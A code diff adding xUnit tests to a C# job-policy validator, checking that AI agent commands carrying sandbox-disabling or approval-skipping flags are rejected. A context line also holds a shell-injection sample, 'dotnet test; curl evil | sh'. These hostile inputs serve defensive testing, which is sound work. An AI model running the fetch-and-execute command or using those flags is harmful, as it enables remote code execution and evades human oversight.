@@ -19,6 +19,19 @@ public class PolicyTests
     public void CommandNotOnAllowlistIsRejected(params string[] argv) =>
         Assert.False(JobPolicy.Validate(_policy, argv, ".").Ok);
 
+    [Theory]
+    [InlineData("claude", "--sandbox", "danger-full-access")]
+    [InlineData("claude", "--sandbox=danger-full-access")]
+    [InlineData("claude", "-c", "approval_policy=never")]
+    [InlineData("claude", "-c", "approval_policy=\"never\"")]
+    [InlineData("claude", "--ask-for-approval", "never")]
+    [InlineData("claude", "--ask-for-approval never")]
+    public void SandboxAndApprovalBypassIsRejected(params string[] argv)
+    {
+        _policy.AllowedCommands.Add("claude");
+        Assert.False(JobPolicy.Validate(_policy, argv, ".").Ok);
+    }
+
     [Fact]
     public void ShellInjectionInSingleArgumentDoesNotMatchAllowlist() =>
         Assert.False(JobPolicy.Validate(_policy, ["dotnet test; curl evil | sh"], ".").Ok);
